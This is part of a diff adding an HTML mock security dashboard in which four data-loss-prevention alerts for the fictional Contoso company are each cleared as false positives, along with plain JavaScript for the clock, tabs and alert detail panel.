+<div id="tpl-dlp-9926" data-title="DLP-9926: Bulk download of classified documents from SharePoint" data-sub="Policy: &quot;Data Loss Prevention - Bulk Access&quot; &bull; 04 Mar 2026 07:55 UTC" data-sev="high">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Policy</span><span class="val">Data Loss Prevention - Bulk Access (DLP-POL-011)</span>
+      <span class="lbl">User</span><span class="val">marcus.johnson@contoso.com (Legal Counsel)</span>
+      <span class="lbl">Activity</span><span class="val">Downloaded 84 files (312 MB) from Legal &gt; Contracts library in 20 minutes</span>
+      <span class="lbl">Labels detected</span><span class="val"><span class="tag">Confidential</span> (67 files) &bull; <span class="tag">Internal</span> (17 files)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Litigation hold preparation</div>
+      <div class="ev-detail">marcus.johnson (Legal Counsel) is preparing documents for a litigation hold related to case CON-v-ACME-2026. He is authorized to access and download the Legal &gt; Contracts library per his role. The downloads were made via SharePoint Sync (OneDrive client) for offline review. All files remain within the Contoso-managed OneDrive. No external sharing detected. Legal team confirmed via email thread (RE: Document Collection for CON-v-ACME). Manager approval on file.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DLP-9927 (FP) === -->
+<div id="tpl-dlp-9927" data-title="DLP-9927: Sensitive file synced to personal OneDrive" data-sub="Policy: &quot;Cloud App Restrictions&quot; &bull; 04 Mar 2026 09:38 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">Policy</span><span class="val">Cloud App Restrictions (DLP-POL-009)</span>
+      <span class="lbl">User</span><span class="val">diana.reyes@contoso.com (HR Coordinator)</span>
+      <span class="lbl">File</span><span class="val mono">Benefits_Overview_2026.pdf</span>
+      <span class="lbl">Label</span><span class="val">Internal</span>
+      <span class="lbl">Destination</span><span class="val">OneDrive Personal (diana.reyes@outlook.com)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Misclassified document, no sensitive data</div>
+      <div class="ev-detail">Benefits_Overview_2026.pdf is a company-wide benefits summary document that is shared publicly with all employees during open enrollment. It was auto-labeled "Internal" by the default labeling policy but contains no PII, financial data, or trade secrets. diana.reyes synced it to review on her personal tablet during lunch. The document is already published on the company intranet (publicly accessible to all staff). Recommend adjusting the auto-label for this document template.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DLP-9928 (FP) === -->
+<div id="tpl-dlp-9928" data-title="DLP-9928: External sharing link created for internal document" data-sub="Policy: &quot;External Sharing Controls&quot; &bull; 04 Mar 2026 10:05 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">Policy</span><span class="val">External Sharing Controls (DLP-POL-005)</span>
+      <span class="lbl">User</span><span class="val">james.oconnor@contoso.com (Partner Relations Manager)</span>
+      <span class="lbl">File</span><span class="val mono">Contoso_Partner_Program_2026.pptx</span>
+      <span class="lbl">Label</span><span class="val">Internal</span>
+      <span class="lbl">Shared with</span><span class="val">partner-team@woodgrovebank.com (verified partner domain)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Approved partner sharing</div>
+      <div class="ev-detail">james.oconnor shared the Partner Program deck with Woodgrove Bank, an established partner (Partner Agreement PA-2024-112). The domain woodgrovebank.com is on the approved external sharing list. The document contains partner-facing content (no internal financials or IP). Sharing link has expiration set (7 days) and is view-only. james.oconnor's role explicitly permits external sharing with approved partners per his access profile.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DLP-9929 (FP) === -->
+<div id="tpl-dlp-9929" data-title="DLP-9929: Labeled document printed on unmanaged printer" data-sub="Policy: &quot;Print Restrictions&quot; &bull; 04 Mar 2026 08:10 UTC" data-sev="info">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></span>
+      <span class="lbl">Policy</span><span class="val">Print Restrictions (DLP-POL-013)</span>
+      <span class="lbl">User</span><span class="val">nina.kowalski@contoso.com (Office Manager)</span>
+      <span class="lbl">File</span><span class="val mono">Office_Emergency_Procedures_2026.docx</span>
+      <span class="lbl">Label</span><span class="val">Internal</span>
+      <span class="lbl">Printer</span><span class="val">HP LaserJet MFP M428 (3rd Floor, not domain-joined)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Routine office operations</div>
+      <div class="ev-detail">nina.kowalski (Office Manager) printed the Emergency Procedures document for the physical bulletin boards on each floor, which is required by building safety regulations. The printer on the 3rd floor was recently replaced and hasn't been enrolled in the managed printer fleet yet (IT ticket HD-2026-1178 for enrollment is open). The document contains only emergency evacuation routes and contact numbers &mdash; no sensitive business data despite the "Internal" label.</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /hidden templates -->
+
+<script>
+// ── Clock ────────────────────────────────────────────────
+function updateClock() {
+  const now = new Date();
+  const h = String(now.getUTCHours()).padStart(2,'0');
+  const m = String(now.getUTCMinutes()).padStart(2,'0');
+  document.getElementById('live-clock').textContent = h + ':' + m + ' UTC';
+  document.getElementById('sb-time').textContent = 'Last sync: ' + h + ':' + m + ':' + String(now.getUTCSeconds()).padStart(2,'0') + ' UTC';
+}
+updateClock();
+setInterval(updateClock, 1000);
+
+// ── Tab Switching ────────────────────────────────────────
+function switchProduct(id, el) {
+  document.querySelectorAll('.main').forEach(m => m.classList.add('hidden'));
+  const t = document.getElementById(id);
+  t.classList.remove('hidden');
+  t.querySelector('.content-body').style.animation = 'none';
+  t.querySelector('.content-body').offsetHeight;
+  t.querySelector('.content-body').style.animation = '';
+  document.querySelectorAll('.product-tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+}
+
+// ── Detail Panel ─────────────────────────────────────────
+function openDetail(tplId) {
+  const tpl = document.getElementById('tpl-' + tplId);
+  if (!tpl) return;
+  const sev = tpl.dataset.sev || 'info';
+  const sevColors = { high: 'var(--sev-high)', med: 'var(--sev-med)', low: 'var(--sev-low)', info: 'var(--sev-info)' };
+  // Build sticky header with actions
+  document.getElementById('detail-top').innerHTML =
+    '<div class="detail-top-row">' +
+      '<div><div class="detail-title">' + tpl.dataset.title + '</div>' +
+      '<div class="detail-sub">' + tpl.dataset.sub + '</div></div>' +
+      '<button class="detail-close" onclick="closeDetail()">&times;</button>' +
+    '</div>' +
+    '<div class="detail-actions">' +
+      '<button class="btn btn-primary">&#128100; Assign to me</button>' +
+      '<button class="btn btn-ghost">&#9998; Change status</button>' +
+      '<button class="btn btn-ghost">&#128279; Link incident</button>' +
+      '<button class="btn btn-ghost">&#128172; Add comment</button>' +
+    '</div>';
+  document.getElementById('detail-content').innerHTML = tpl.innerHTML;
+  const overlay = document.getElementById('detail-overlay');
+  overlay.style.display = 'block';
+  requestAnimationFrame(() => overlay.classList.add('open'));
+  document.body.style.overflow = 'hidden';
+}
+function closeDetail(e) {
+  if (e && e.target !== e.currentTarget) return;
+  const overlay = document.getElementById('detail-overlay');
+  overlay.classList.remove('open');
+  setTimeout(() => { overlay.style.display = 'none'; document.body.style.overflow = ''; }, 350);
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeDetail() });
+
+// ── Toast auto-dismiss ───────────────────────────────────
+function dismissToast() {
+  const t = document.getElementById('toast');
+  t.classList.add('hiding');
+  setTimeout(() => t.style.display = 'none', 300);
+}
+setTimeout(dismissToast, 8000);
+</script>
+</body>
+</html>
